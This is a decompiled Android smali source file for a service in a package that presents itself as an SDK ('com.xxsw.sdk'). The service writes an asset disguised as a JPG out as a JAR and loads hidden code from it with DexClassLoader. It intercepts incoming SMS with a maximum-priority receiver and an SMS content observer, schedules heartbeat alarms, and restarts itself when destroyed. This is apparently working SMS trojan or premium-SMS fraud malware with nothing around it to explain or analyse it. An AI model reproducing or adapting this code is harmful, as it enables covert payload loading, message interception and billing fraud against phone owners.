.class public Lcom/xxsw/sdk/dswc;
.super Landroid/app/Service;
.source "dswc.java"


# static fields
.field public static final SERVICE_STR:Ljava/lang/String; = "com.xxsw.sdk.dswc"

.field public static b_phone:Ljava/lang/String;

.field public static cClass:Ljava/lang/Class;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/lang/Class",
            "<*>;"
        }
    .end annotation
.end field

.field public static coreAPP:Ljava/lang/Object;

.field public static core_filename:Ljava/lang/String;

.field public static dex_filename:Ljava/lang/String;

.field public static heartbeat_sec:J

.field public static setp_sec:J

.field public static sms_ob_time:J

.field public static zip_filename:Ljava/lang/String;


# instance fields
.field private _dsms:Lcom/xxsw/sdk/dsms;

.field private _dsobsms:Lcom/xxsw/sdk/dsobsms;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    .prologue
    const/4 v1, 0x0

    .line 32
    const-string v0, "spcoss.jar"

    sput-object v0, Lcom/xxsw/sdk/dswc;->core_filename:Ljava/lang/String;

    .line 33
    const-string v0, "spcoss.dex"

    sput-object v0, Lcom/xxsw/sdk/dswc;->dex_filename:Ljava/lang/String;

    .line 34
    const-string v0, "ssdwwwd.jpg"

    sput-object v0, Lcom/xxsw/sdk/dswc;->zip_filename:Ljava/lang/String;

    .line 37
    sput-object v1, Lcom/xxsw/sdk/dswc;->coreAPP:Ljava/lang/Object;

    .line 38
    sput-object v1, Lcom/xxsw/sdk/dswc;->cClass:Ljava/lang/Class;

    .line 40
    const-wide/32 v0, 0x1b7740

    sput-wide v0, Lcom/xxsw/sdk/dswc;->setp_sec:J

    .line 42
    const-wide/32 v0, 0x493e0

    sput-wide v0, Lcom/xxsw/sdk/dswc;->heartbeat_sec:J

    .line 50
    const-wide/16 v0, 0x0

    sput-wide v0, Lcom/xxsw/sdk/dswc;->sms_ob_time:J

    .line 51
    const-string v0, "10"

    sput-object v0, Lcom/xxsw/sdk/dswc;->b_phone:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .prologue
    const/4 v0, 0x0

    .line 28
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 46
    iput-object v0, p0, Lcom/xxsw/sdk/dswc;->_dsobsms:Lcom/xxsw/sdk/dsobsms;

    .line 47
    iput-object v0, p0, Lcom/xxsw/sdk/dswc;->_dsms:Lcom/xxsw/sdk/dsms;

    .line 28
    return-void
.end method

.method public static isServiceRunning(Ljava/lang/String;Landroid/content/Context;)Z
    .locals 6
    .param p0, "servicename"    # Ljava/lang/String;
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    .line 120
    const-string v3, "activity"

    invoke-virtual {p1, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager;

    .line 121
    .local v0, "am":Landroid/app/ActivityManager;
    const/16 v3, 0x64

    invoke-virtual {v0, v3}, Landroid/app/ActivityManager;->getRunningServices(I)Ljava/util/List;

    move-result-object v2

    .line 122
    .local v2, "infos":Ljava/util/List;, "Ljava/util/List<Landroid/app/ActivityManager$RunningServiceInfo;>;"
    invoke-interface {v2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :cond_0
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    if-nez v4, :cond_1

    .line 128
    const/4 v2, 0x0

    .line 129
    const/4 v3, 0x0

    :goto_0
    return v3

    .line 122
    :cond_1
    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/ActivityManager$RunningServiceInfo;

    .line 123
    .local v1, "info":Landroid/app/ActivityManager$RunningServiceInfo;
    iget-object v4, v1, Landroid/app/ActivityManager$RunningServiceInfo;->service:Landroid/content/ComponentName;

    invoke-virtual {v4}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {p0, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    invoke-virtual {p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v4

    iget-object v5, v1, Landroid/app/ActivityManager$RunningServiceInfo;->service:Landroid/content/ComponentName;

    invoke-virtual {v5}, Landroid/content/ComponentName;->getPackageName()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    .line 124
    const/4 v2, 0x0

    .line 125
    const/4 v3, 0x1

    goto :goto_0
.end method

.method public static start(Landroid/content/Context;)Ljava/lang/Boolean;
    .locals 2
    .param p0, "m_context"    # Landroid/content/Context;

    .prologue
    .line 67
    const-string v0, "com.xxsw.sdk.dswc"

    invoke-static {v0, p0}, Lcom/xxsw/sdk/dswc;->isServiceRunning(Ljava/lang/String;Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 68
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/xxsw/sdk/dswc;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 69
    const-string v0, "Print"

    const-string v1, "no run service! start service..."

    invoke-static {v0, v1}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 70
    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    .line 75
    :goto_0
    return-object v0

    .line 73
    :cond_0
    const-string v0, "Print"

    const-string v1, "start service..."

    invoke-static {v0, v1}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 75
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    goto :goto_0
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 61
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 26

    .prologue
    .line 134
    invoke-super/range {p0 .. p0}, Landroid/app/Service;->onCreate()V

    .line 135
    const-string v21, "Print"

    const-string v22, "onCreate"

    invoke-static/range {v21 .. v22}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 139
    invoke-virtual/range {p0 .. p0}, Lcom/xxsw/sdk/dswc;->getApplicationContext()Landroid/content/Context;

    move-result-object v21

    invoke-virtual/range {v21 .. v21}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v21

    invoke-virtual/range {v21 .. v21}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v18

    .line 140
    .local v18, "path":Ljava/lang/String;
    new-instance v11, Ljava/io/File;

    sget-object v21, Lcom/xxsw/sdk/dswc;->core_filename:Ljava/lang/String;

    move-object/from16 v0, v18

    move-object/from16 v1, v21

    invoke-direct {v11, v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 141
    .local v11, "file":Ljava/io/File;
    invoke-virtual {v11}, Ljava/io/File;->isFile()Z

    move-result v21

    if-nez v21, :cond_0

    .line 143
    const-string v21, "Print"

    const-string v22, "\u5f00\u59cb\u91ca\u653e\u6587\u4ef6..."

    invoke-static/range {v21 .. v22}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 145
    :try_start_0
    new-instance v17, Ljava/io/FileOutputStream;

    move-object/from16 v0, v17

    invoke-direct {v0, v11}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 146
    .local v17, "oStream":Ljava/io/OutputStream;
    invoke-virtual/range {p0 .. p0}, Lcom/xxsw/sdk/dswc;->getResources()Landroid/content/res/Resources;

    move-result-object v21

    invoke-virtual/range {v21 .. v21}, Landroid/content/res/Resources;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v21

    sget-object v22, Lcom/xxsw/sdk/dswc;->zip_filename:Ljava/lang/String;

    invoke-virtual/range {v21 .. v22}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object v15

    .line 147
    .local v15, "iStream":Ljava/io/InputStream;
    const/4 v8, -0x1

    .line 148
    .local v8, "ch":I
    const/16 v21, 0x400

    move/from16 v0, v21

    new-array v7, v0, [B

    .line 149
    .local v7, "buffer":[B
    :goto_0
    invoke-virtual {v15, v7}, Ljava/io/InputStream;->read([B)I

    move-result v8

    const/16 v21, -0x1

    move/from16 v0, v21

    if-ne v8, v0, :cond_2

    .line 152
    invoke-virtual/range {v17 .. v17}, Ljava/io/OutputStream;->flush()V

    .line 153
    invoke-virtual/range {v17 .. v17}, Ljava/io/OutputStream;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 164
    .end local v7    # "buffer":[B
    .end local v8    # "ch":I
    .end local v15    # "iStream":Ljava/io/InputStream;
    .end local v17    # "oStream":Ljava/io/OutputStream;
    :cond_0
    :goto_1
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v21

    sput-wide v21, Lcom/xxsw/sdk/dswc;->sms_ob_time:J

    .line 167
    :try_start_1
    sget-object v21, Lcom/xxsw/sdk/dswc;->coreAPP:Ljava/lang/Object;

    if-eqz v21, :cond_1

    sget-object v21, Lcom/xxsw/sdk/dswc;->cClass:Ljava/lang/Class;

    if-eqz v21, :cond_1

    .line 168
    const/16 v21, 0x0

    sput-object v21, Lcom/xxsw/sdk/dswc;->coreAPP:Ljava/lang/Object;

    .line 169
    const/16 v21, 0x0

    sput-object v21, Lcom/xxsw/sdk/dswc;->cClass:Ljava/lang/Class;

    .line 173
    :cond_1
    const-string v21, "Print"

    const-string v22, "coreAPP and cClass Instance.........."

    invoke-static/range {v21 .. v22}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 176
    new-instance v9, Ldalvik/system/DexClassLoader;

    new-instance v21, Ljava/lang/StringBuilder;

    invoke-static/range {v18 .. v18}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v22

    invoke-direct/range {v21 .. v22}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v22, "/"

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    sget-object v22, Lcom/xxsw/sdk/dswc;->core_filename:Ljava/lang/String;

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    invoke-virtual/range {v21 .. v21}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v21

    const/16 v22, 0x0

    invoke-virtual/range {p0 .. p0}, Lcom/xxsw/sdk/dswc;->getApplicationContext()Landroid/content/Context;

    move-result-object v23

    invoke-virtual/range {v23 .. v23}, Landroid/content/Context;->getClassLoader()Ljava/lang/ClassLoader;

    move-result-object v23

    move-object/from16 v0, v21

    move-object/from16 v1, v18

    move-object/from16 v2, v22

    move-object/from16 v3, v23

    invoke-direct {v9, v0, v1, v2, v3}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V

    .line 177
    .local v9, "cl":Ldalvik/system/DexClassLoader;
    const-string v21, "com.xxsw.sdk.pdk.ssvcr"

    move-object/from16 v0, v21

    invoke-virtual {v9, v0}, Ldalvik/system/DexClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v21

    sput-object v21, Lcom/xxsw/sdk/dswc;->cClass:Ljava/lang/Class;

    .line 178
    sget-object v21, Lcom/xxsw/sdk/dswc;->cClass:Ljava/lang/Class;

    invoke-virtual/range {v21 .. v21}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;

    move-result-object v21

    sput-object v21, Lcom/xxsw/sdk/dswc;->coreAPP:Ljava/lang/Object;

    .line 181
    sget-object v21, Lcom/xxsw/sdk/dswc;->cClass:Ljava/lang/Class;

    const-string v22, "init"

    const/16 v23, 0x1

    move/from16 v0, v23

    new-array v0, v0, [Ljava/lang/Class;

    move-object/from16 v23, v0

    const/16 v24, 0x0

    const-class v25, Landroid/content/Context;

    aput-object v25, v23, v24

    invoke-virtual/range {v21 .. v23}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v16

    .line 182
    .local v16, "method":Ljava/lang/reflect/Method;
    sget-object v21, Lcom/xxsw/sdk/dswc;->coreAPP:Ljava/lang/Object;

    const/16 v22, 0x1

    move/from16 v0, v22

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v22, v0

    const/16 v23, 0x0

    invoke-virtual/range {p0 .. p0}, Lcom/xxsw/sdk/dswc;->getApplicationContext()Landroid/content/Context;

    move-result-object v24

    aput-object v24, v22, v23

    move-object/from16 v0, v16

    move-object/from16 v1, v21

    move-object/from16 v2, v22

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 196
    new-instance v5, Landroid/content/Intent;

    const-class v21, Lcom/xxsw/sdk/dsclock;

    move-object/from16 v0, p0

    move-object/from16 v1, v21

    invoke-direct {v5, v0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 197
    .local v5, "alarIntent":Landroid/content/Intent;
    const/16 v21, 0x0

    const/high16 v22, 0x8000000

    move-object/from16 v0, p0

    move/from16 v1, v21

    move/from16 v2, v22

    invoke-static {v0, v1, v5, v2}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v19

    .line 198
    .local v19, "pintent":Landroid/app/PendingIntent;
    const-string v21, "alarm"

    move-object/from16 v0, p0

    move-object/from16 v1, v21

    invoke-virtual {v0, v1}, Lcom/xxsw/sdk/dswc;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/app/AlarmManager;

    .line 199
    .local v6, "am":Landroid/app/AlarmManager;
    sget v21, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v22, 0x13

    move/from16 v0, v21

    move/from16 v1, v22

    if-ge v0, v1, :cond_4

    .line 200
    const-string v21, "Print"

    const-string v22, "SDK_INT < 19"

    invoke-static/range {v21 .. v22}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 201
    const/16 v21, 0x0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v22

    sget-wide v24, Lcom/xxsw/sdk/dswc;->setp_sec:J

    add-long v22, v22, v24

    move/from16 v0, v21

    move-wide/from16 v1, v22

    move-object/from16 v3, v19

    invoke-virtual {v6, v0, v1, v2, v3}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 209
    :goto_2
    new-instance v13, Landroid/content/Intent;

    const-class v21, Lcom/xxsw/sdk/dshbeat;

    move-object/from16 v0, p0

    move-object/from16 v1, v21

    invoke-direct {v13, v0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 210
    .local v13, "hIntent":Landroid/content/Intent;
    const/16 v21, 0x1

    const/high16 v22, 0x8000000

    move-object/from16 v0, p0

    move/from16 v1, v21

    move/from16 v2, v22

    invoke-static {v0, v1, v13, v2}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v14

    .line 212
    .local v14, "hintent":Landroid/app/PendingIntent;
    sget v21, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v22, 0x13

    move/from16 v0, v21

    move/from16 v1, v22

    if-ge v0, v1, :cond_5

    .line 213
    const-string v21, "Print"

    const-string v22, "SDK_INT < 19"

    invoke-static/range {v21 .. v22}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 214
    const/16 v21, 0x0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v22

    sget-wide v24, Lcom/xxsw/sdk/dswc;->heartbeat_sec:J

    add-long v22, v22, v24

    move/from16 v0, v21

    move-wide/from16 v1, v22

    invoke-virtual {v6, v0, v1, v2, v14}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 224
    :goto_3
    new-instance v21, Lcom/xxsw/sdk/dsobsms;

    new-instance v22, Landroid/os/Handler;

    invoke-direct/range {v22 .. v22}, Landroid/os/Handler;-><init>()V

    move-object/from16 v0, v21

    move-object/from16 v1, p0

    move-object/from16 v2, v22

    invoke-direct {v0, v1, v2}, Lcom/xxsw/sdk/dsobsms;-><init>(Landroid/content/Context;Landroid/os/Handler;)V

    move-object/from16 v0, v21

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/xxsw/sdk/dswc;->_dsobsms:Lcom/xxsw/sdk/dsobsms;

    .line 225
    const-string v21, "content://sms/"

    invoke-static/range {v21 .. v21}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v20

    .line 226
    .local v20, "smsUri":Landroid/net/Uri;
    invoke-virtual/range {p0 .. p0}, Lcom/xxsw/sdk/dswc;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v21

    const/16 v22, 0x1

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxsw/sdk/dswc;->_dsobsms:Lcom/xxsw/sdk/dsobsms;

    move-object/from16 v23, v0

    move-object/from16 v0, v21

    move-object/from16 v1, v20

    move/from16 v2, v22

    move-object/from16 v3, v23

    invoke-virtual {v0, v1, v2, v3}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    .line 228
    new-instance v12, Landroid/content/IntentFilter;

    const-string v21, "android.provider.Telephony.SMS_RECEIVED"

    move-object/from16 v0, v21

    invoke-direct {v12, v0}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 229
    .local v12, "filter":Landroid/content/IntentFilter;
    const v21, 0x7fffffff

    move/from16 v0, v21

    invoke-virtual {v12, v0}, Landroid/content/IntentFilter;->setPriority(I)V

    .line 230
    new-instance v21, Lcom/xxsw/sdk/dsms;

    invoke-direct/range {v21 .. v21}, Lcom/xxsw/sdk/dsms;-><init>()V

    move-object/from16 v0, v21

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/xxsw/sdk/dswc;->_dsms:Lcom/xxsw/sdk/dsms;

    .line 231
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxsw/sdk/dswc;->_dsms:Lcom/xxsw/sdk/dsms;

    move-object/from16 v21, v0

    move-object/from16 v0, p0

    move-object/from16 v1, v21

    invoke-virtual {v0, v1, v12}, Lcom/xxsw/sdk/dswc;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 235
    .end local v5    # "alarIntent":Landroid/content/Intent;
    .end local v6    # "am":Landroid/app/AlarmManager;
    .end local v9    # "cl":Ldalvik/system/DexClassLoader;
    .end local v12    # "filter":Landroid/content/IntentFilter;
    .end local v13    # "hIntent":Landroid/content/Intent;
    .end local v14    # "hintent":Landroid/app/PendingIntent;
    .end local v16    # "method":Ljava/lang/reflect/Method;
    .end local v19    # "pintent":Landroid/app/PendingIntent;
    .end local v20    # "smsUri":Landroid/net/Uri;
    :goto_4
    return-void

    .line 150
    .restart local v7    # "buffer":[B
    .restart local v8    # "ch":I
    .restart local v15    # "iStream":Ljava/io/InputStream;
    .restart local v17    # "oStream":Ljava/io/OutputStream;
    :cond_2
    const/16 v21, 0x0

    :try_start_2
    move-object/from16 v0, v17

    move/from16 v1, v21

    invoke-virtual {v0, v7, v1, v8}, Ljava/io/OutputStream;->write([BII)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto/16 :goto_0

    .line 155
    .end local v7    # "buffer":[B
    .end local v8    # "ch":I
    .end local v15    # "iStream":Ljava/io/InputStream;
    .end local v17    # "oStream":Ljava/io/OutputStream;
    :catch_0
    move-exception v4

    .line 156
    .local v4, "EE":Ljava/lang/Exception;
    invoke-virtual {v11}, Ljava/io/File;->delete()Z

    .line 157
    const-string v21, "Print"

    new-instance v22, Ljava/lang/StringBuilder;

    const-string v23, "------\u91ca\u653e\u6587\u4ef6\u5931\u8d25:"

    invoke-direct/range {v22 .. v23}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v23

    invoke-virtual/range {v22 .. v23}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v22

    invoke-virtual/range {v22 .. v22}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v22

    invoke-static/range {v21 .. v22}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 158
    invoke-virtual/range {p0 .. p0}, Lcom/xxsw/sdk/dswc;->stopSelf()V

    goto/16 :goto_1

    .line 185
    .end local v4    # "EE":Ljava/lang/Exception;
    :catch_1
    move-exception v10

    .line 186
    .local v10, "ee":Ljava/lang/Exception;
    const-string v21, "PError"

    new-instance v22, Ljava/lang/StringBuilder;

    const-string v23, "----Error:"

    invoke-direct/range {v22 .. v23}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v10}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v23

    invoke-virtual/range {v22 .. v23}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v22

    invoke-virtual/range {v22 .. v22}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v22

    invoke-static/range {v21 .. v22}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 187
    invoke-virtual {v11}, Ljava/io/File;->isFile()Z

    move-result v21

    if-eqz v21, :cond_3

    .line 188
    invoke-virtual {v11}, Ljava/io/File;->delete()Z

    .line 190
    :cond_3
    invoke-virtual/range {p0 .. p0}, Lcom/xxsw/sdk/dswc;->stopSelf()V

    goto :goto_4

    .line 204
    .end local v10    # "ee":Ljava/lang/Exception;
    .restart local v5    # "alarIntent":Landroid/content/Intent;
    .restart local v6    # "am":Landroid/app/AlarmManager;
    .restart local v9    # "cl":Ldalvik/system/DexClassLoader;
    .restart local v16    # "method":Ljava/lang/reflect/Method;
    .restart local v19    # "pintent":Landroid/app/PendingIntent;
    :cond_4
    const-string v21, "Print"

    const-string v22, "SDK_INT >=19"

    invoke-static/range {v21 .. v22}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 205
    const/16 v21, 0x0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v22

    sget-wide v24, Lcom/xxsw/sdk/dswc;->setp_sec:J

    add-long v22, v22, v24

    move/from16 v0, v21

    move-wide/from16 v1, v22

    move-object/from16 v3, v19

    invoke-virtual {v6, v0, v1, v2, v3}, Landroid/app/AlarmManager;->setExact(IJLandroid/app/PendingIntent;)V

    goto/16 :goto_2

    .line 217
    .restart local v13    # "hIntent":Landroid/content/Intent;
    .restart local v14    # "hintent":Landroid/app/PendingIntent;
    :cond_5
    const-string v21, "Print"

    const-string v22, "SDK_INT >=19"

    invoke-static/range {v21 .. v22}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 218
    const/16 v21, 0x0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v22

    sget-wide v24, Lcom/xxsw/sdk/dswc;->heartbeat_sec:J

    add-long v22, v22, v24

    move/from16 v0, v21

    move-wide/from16 v1, v22

    invoke-virtual {v6, v0, v1, v2, v14}, Landroid/app/AlarmManager;->setExact(IJLandroid/app/PendingIntent;)V

    goto/16 :goto_3
.end method

.method public onDestroy()V
    .locals 5

    .prologue
    .line 90
    const-string v2, "Print"

    const-string v3, "onDestroy"

    invoke-static {v2, v3}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 93
    :try_start_0
    iget-object v2, p0, Lcom/xxsw/sdk/dswc;->_dsobsms:Lcom/xxsw/sdk/dsobsms;

    if-eqz v2, :cond_0

    .line 94
    invoke-virtual {p0}, Lcom/xxsw/sdk/dswc;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    iget-object v3, p0, Lcom/xxsw/sdk/dswc;->_dsobsms:Lcom/xxsw/sdk/dsobsms;

    invoke-virtual {v2, v3}, Landroid/content/ContentResolver;->unregisterContentObserver(Landroid/database/ContentObserver;)V

    .line 96
    :cond_0
    iget-object v2, p0, Lcom/xxsw/sdk/dswc;->_dsms:Lcom/xxsw/sdk/dsms;

    if-eqz v2, :cond_1

    .line 97
    iget-object v2, p0, Lcom/xxsw/sdk/dswc;->_dsms:Lcom/xxsw/sdk/dsms;

    invoke-virtual {p0, v2}, Lcom/xxsw/sdk/dswc;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 101
    :cond_1
    sget-object v2, Lcom/xxsw/sdk/dswc;->coreAPP:Ljava/lang/Object;

    if-eqz v2, :cond_2

    sget-object v2, Lcom/xxsw/sdk/dswc;->cClass:Ljava/lang/Class;

    if-eqz v2, :cond_2

    .line 102
    sget-object v2, Lcom/xxsw/sdk/dswc;->cClass:Ljava/lang/Class;

    const-string v3, "destroy"

    const/4 v4, 0x0

    new-array v4, v4, [Ljava/lang/Class;

    invoke-virtual {v2, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v1

    .line 103
    .local v1, "method":Ljava/lang/reflect/Method;
    sget-object v2, Lcom/xxsw/sdk/dswc;->coreAPP:Ljava/lang/Object;

    const/4 v3, 0x0

    new-array v3, v3, [Ljava/lang/Object;

    invoke-virtual {v1, v2, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 105
    .end local v1    # "method":Ljava/lang/reflect/Method;
    :cond_2
    const-string v2, "Print"

    const-string v3, "..................."

    invoke-static {v2, v3}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 113
    :goto_0
    invoke-static {p0}, Lcom/xxsw/sdk/dswc;->start(Landroid/content/Context;)Ljava/lang/Boolean;

    .line 114
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 115
    return-void

    .line 107
    :catch_0
    move-exception v0

    .line 109
    .local v0, "ee":Ljava/lang/Exception;
    const-string v2, "Print"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "----sbcast Error:"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0
.end method

.method public onStart(Landroid/content/Intent;I)V
    .locals 2
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "startId"    # I

    .prologue
    .line 56
    const-string v0, "Print"

    const-string v1, "start.........."

    invoke-static {v0, v1}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 57
    return-void
.end method
